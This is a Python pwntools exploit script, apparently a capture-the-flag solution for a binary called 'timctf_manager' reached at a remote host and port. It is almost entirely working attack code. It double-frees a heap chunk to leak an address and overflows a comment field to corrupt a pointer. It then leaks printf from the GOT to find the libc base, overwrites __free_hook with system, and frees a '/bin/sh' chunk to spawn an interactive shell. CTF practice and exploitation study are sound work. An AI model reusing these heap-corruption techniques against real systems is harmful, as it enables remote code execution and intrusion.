#if one_gadget doesn't work then house of force
#https://www.youtube.com/watch?v=PISoSH8KGVI

from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./timctf_manager",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11114,
}

def add(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "1")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def remove(pid):
	sla("0: Exit", "2")
	sla("Enter player id (1-4) ", str(pid))

def edit(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "3")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def viewplayer(pid):
	sla("0: Exit", "4")
	sla("Enter player id (1-4) ", str(pid))

def viewteam():
	sla("0: Exit", "5")

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def exploit(p):
	print_menu = 0x00400827
	printf_got = elf.got['printf']
	data  = elf.get_section_by_name(".data").header.sh_addr

	add(1, "", 1, 2, 3, 4, "")
	add(2, "", 1, 2, 3, 4, "")
	remove(1)
	remove(1)
	viewteam()

	ru('reversing and exploitation: ')
	lo = int(p.recvline().strip())
	lo = str(tohex(lo, 32))[2:]
	ru("crypto: ")
	hi = str(hex(int(p.recvline().strip())))
	leak = int(hi + lo, 16)

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(printf_got)

	edit(1, "", 1, 1, 1, 1, payload)
	viewplayer(2)
	ru("Extra note/comment: ")

	printf = u64(r(8))
	base = printf - libc.symbols['printf']
	free_hook = base + libc.symbols['__free_hook']
	system = base + libc.symbols['system']
	
	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(free_hook)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(system))

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(leak)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(0x0068732f6e69622f))
	remove(1)
	
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
